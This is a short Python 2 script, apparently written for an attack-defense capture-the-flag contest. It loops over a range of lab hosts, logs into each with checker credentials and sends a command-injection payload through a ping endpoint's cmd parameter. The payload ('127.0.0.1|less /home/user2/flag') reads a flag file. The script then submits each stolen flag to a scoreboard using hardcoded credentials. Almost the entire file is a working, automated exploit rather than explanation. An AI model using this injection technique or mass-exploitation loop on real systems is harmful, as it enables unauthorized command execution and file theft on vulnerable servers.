__author__ = 'nlfox233'
import requests
import json
import re
def subFlag(flag):
    import requests
    import re
    s=requests.Session()
    loginRes = requests.get('http://192.168.150.1/login').text
    token = re.findall('\<input type=\'hidden\' name\=\'csrfmiddlewaretoken\' value=\'(.*?)\' \/\>',loginRes)[0]
    s.cookies['csrftoken']=token
    loginData = s.post('http://192.168.150.1/login',files={
        'csrfmiddlewaretoken':(None,token),
        'username':(None,'F4nt45i4'),
        'password':(None,'dutsecPassword')
    }).text
    token = re.findall('\<input type=\'hidden\' name\=\'csrfmiddlewaretoken\' value=\'(.*?)\' \/\>',loginData)[0]
    s.cookies['csrftoken']=token
    flagPost=s.post('http://192.168.150.1/submit_flag',files={
        'csrfmiddlewaretoken':(None,token),
        'flag':(None,flag),
    }
    ).text
    if ('your flag is true' in flagPost):
        return True
    return False

for i in xrange(201,215):
    try:
        url = 'http://192.168.150.{num}:8080'.format(num=str(i))
        login='/login?username=checker&password=checker'
        token =  json.loads(requests.get(url+login).text)['Info']
        payload = '/rest?act=ping&token={token}&cmd=127.0.0.1|less%20/home/user2/flag'.format(token=token)
        flag = re.findall('\"Info\"\:\"(.*?)-c:',requests.get(url+payload).text)[0]
        print i,
        print flag
        print subFlag(flag)
    except:
        pass

